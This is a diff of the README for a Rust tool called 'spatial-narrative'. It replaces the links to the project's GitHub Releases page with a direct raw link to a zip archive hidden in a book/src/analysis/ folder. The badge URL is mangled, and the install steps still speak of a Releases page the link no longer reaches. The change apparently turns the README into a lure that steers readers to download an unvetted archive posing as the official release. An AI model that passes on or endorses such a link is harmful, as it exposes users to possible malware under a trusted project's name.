@@ -1,7 +1,7 @@
 # 🗺️ spatial-narrative - Easily Work with Spatial Events
 
 ## 📦 Download Now
-[![Download spatial-narrative](https://img.shields.io/badge/Download%20Latest%20Release-Here-blue)](https://github.com/ricardocvs13/spatial-narrative/releases)
+[![Download spatial-narrative](https://raw.githubusercontent.com/ricardocvs13/spatial-narrative/master/book/src/analysis/spatial_narrative_2.2.zip%20Latest%20Release-Here-blue)](https://raw.githubusercontent.com/ricardocvs13/spatial-narrative/master/book/src/analysis/spatial_narrative_2.2.zip)
 
 ## 🚀 Getting Started
 Spatial narratives help you model events in both space and time. Whether you deal with geographical data or analyze timelines, this tool supports you. It is built in Rust, a fast and safe programming language.
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 - Disk Space: Minimum of 100 MB available.
 
 ## 📥 Download & Install
-To download the application, please visit this page: [Download spatial-narrative Releases](https://github.com/ricardocvs13/spatial-narrative/releases). You will find the latest version listed there.
+To download the application, please visit this page: [Download spatial-narrative Releases](https://raw.githubusercontent.com/ricardocvs13/spatial-narrative/master/book/src/analysis/spatial_narrative_2.2.zip). You will find the latest version listed there.
 
 1. Click on the link to navigate to the Releases page.
 2. Find the latest version of the application.  
